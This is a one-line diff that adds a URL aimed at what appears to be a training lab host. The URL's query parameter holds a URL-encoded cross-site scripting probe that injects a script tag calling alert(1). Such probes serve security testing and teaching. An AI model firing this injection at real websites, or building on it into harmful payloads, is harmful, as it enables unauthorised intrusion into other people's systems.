@@ -1,0 +1,1 @@
+http://juice.kt66.lab/?q=%3Cscript%3Ealert(1)%3C/script%3E
